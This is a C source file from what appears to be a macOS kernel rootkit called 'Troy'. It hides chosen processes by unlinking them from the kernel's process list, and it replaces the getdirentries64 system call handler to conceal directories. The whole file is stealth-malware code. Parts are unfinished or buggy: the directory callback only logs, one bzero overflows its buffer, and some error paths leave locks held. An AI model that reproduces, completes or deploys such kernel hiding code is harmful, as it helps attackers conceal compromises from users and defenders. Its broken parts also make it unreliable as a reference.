//
//  HookCAPI.c
//  Troy
//
//  Created by Axis on 5/8/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//
#include <libkern/libkern.h>
#include <sys/errno.h>
#include <sys/lock.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/malloc.h>
#include <sys/dirent.h>

#include "HookCAPI.h"
#include "configure.h"
#include "debugInfo.h"
#include "HookSystemCall.h"

#pragma mark lock
extern lck_mtx_t *lck_mtx_hide_process;
extern lck_mtx_t *lck_mtx_hide_file;
extern lck_mtx_t *lck_mtx_hide_directory;
extern lck_mtx_t *lck_mtx_hide_proc_array;
#pragma mark hide_array
extern struct hide_proc_list hide_proc_array;  //for store process that is hide
#pragma origianl function
extern getdirentries64_function_prototype my_getdirentries64;

int hide_given_directory(troy_hide_object *directory_hide)
{
    if(directory_hide==NULL) return TROY_ERROR_INVALID_PARAMETER;
    if(directory_hide->objec_type!=TROY_DIR)
    {
        LOG(LOG_ERROR, "directory types are not matached.");
        return TROY_ERROR_NOT_MATCH;
    }

    lck_mtx_lock(lck_mtx_hide_directory);

    getdirentries64_function_prototype **original_getdirentries_ptr=
                            (getdirentries64_function_prototype**)_MALLOC(sizeof(getdirentries64_function_prototype*), M_TEMP, M_WAITOK);
    if(original_getdirentries_ptr==NULL) return TROY_ERROR_NOMEM;
    GetOriginalFunction(SYS_getdirentries64, (sy_call_t**)original_getdirentries_ptr);
    my_getdirentries64=*(getdirentries64_function_prototype*)original_getdirentries_ptr;
    LOG(LOG_ERROR, "original_getdirentries_ptr address is %p", my_getdirentries64);

    int return_code = SetSystemCallHandle(my_getdirentries64_callback, SYS_getdirentries64);
    if(return_code!=TROY_SUCCESS)
    {
        if(original_getdirentries_ptr!=NULL) SAFE_FREE(original_getdirentries_ptr);
        lck_mtx_unlock(lck_mtx_hide_directory);
        return return_code;
    }

    lck_mtx_unlock(lck_mtx_hide_directory);
    return TROY_SUCCESS;
}

errno_t hide_given_process(troy_hide_object *process_hide)
{
    if(process_hide==NULL) return TROY_ERROR_INVALID_PARAMETER;
    if(process_hide->objec_type!=TROY_PROCESS)
    {
        LOG(LOG_ERROR, "The file types are not matched.");
        return TROY_ERROR_NOT_MATCH;
    }

    lck_mtx_lock(lck_mtx_hide_process);

    struct proc_yousemite* kernel_proc = (struct proc_yousemite*)kernproc;
    char process_name[PROCESS_NAME_LENGTH];
    bzero(process_name, PROCESS_NAME_LENGTH);
    do
    {
        int pid=proc_pid((proc_t)kernel_proc);
        proc_name(pid, process_name, PROCESS_NAME_LENGTH-1);    //get only $(PROCESS_NAME_LENGTH)-1 bytes
        LOG(LOG_ERROR, "process name is %s", process_name);
        if(strcasecmp(process_name, process_hide->name)==0)
        {
            LOG(LOG_INFO, "Get process name scuuessfully");
            LIST_REMOVE(kernel_proc, p_list);

            struct hide_proc *proc = (struct hide_proc *)_MALLOC(sizeof(struct hide_proc), M_TEMP, M_WAITOK);
            if(proc==NULL) return TROY_ERROR_NOMEM;
            bzero(proc, sizeof(struct hide_proc));

            proc->proc = (struct proc_yousemite*)_MALLOC(sizeof(struct proc_yousemite), M_TEMP, M_WAITOK);
            if(proc->proc==NULL) return TROY_ERROR_NOMEM;
            bzero(proc, sizeof(struct proc_yousemite));

            memcpy(proc->proc, kernel_proc, sizeof(struct proc_yousemite));
            memcpy(proc->name, process_name, strlen(process_name));
            proc->proc_pid = pid;

            lck_mtx_lock(lck_mtx_hide_proc_array);
            TAILQ_INSERT_HEAD(&hide_proc_array, proc, next_ptr);    //the process that is hided by Troy
            lck_mtx_unlock(lck_mtx_hide_proc_array);
        }
        /*
         * here we must use le_prev, because le_next is NULL.
         * and current kernproc's name is kernel_task
         */
        kernel_proc = (struct proc_yousemite*)kernel_proc->p_list.le_prev;
    }while(kernel_proc);

    lck_mtx_unlock(lck_mtx_hide_process);

    return TROY_SUCCESS;
}

int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap,
                                user_ssize_t *retval)
{
    user_ssize_t buf_size;
    void *mem;
    struct direntry *direntry_ptr=NULL;
    LOG(LOG_ERROR, "in ");
    int return_code = my_getdirentries64(p, uap, retval);
    if(return_code!=0)
    {
        LOG(LOG_ERROR, "getdirentries64 failed");
        return return_code;
    }

    buf_size = *retval;
    if(buf_size<=0) return TROY_ERROR_DATA_LENGTH_INVALID;


    mem = _MALLOC(buf_size, M_TEMP, M_WAITOK);
    if(mem==NULL) return TROY_ERROR_NOMEM;

    copyin(uap->bufp, mem, buf_size);
    direntry_ptr=mem;

    if(direntry_ptr!=NULL)
    {
        LOG(LOG_ERROR, "file name is %s", direntry_ptr->d_name);
        LOG(LOG_ERROR, "file d_ino=%llu", direntry_ptr->d_ino);
        LOG(LOG_ERROR, "file d_reclen=%d", direntry_ptr->d_reclen);
    }

    return 0;
}

/*errno_t hide_specific_files(troy_hide_object *files_hide)
{
    sy_call_t *
    GetOriginalFunction(SYS_getdirentries64, <#sy_call_t **orginal_ptr#>)
    SetSystemCallHandle(<#void *function_handle#>, <#int syscall_no#>, <#int syscall_nargs#>, <#void *original_handle#>)
}*/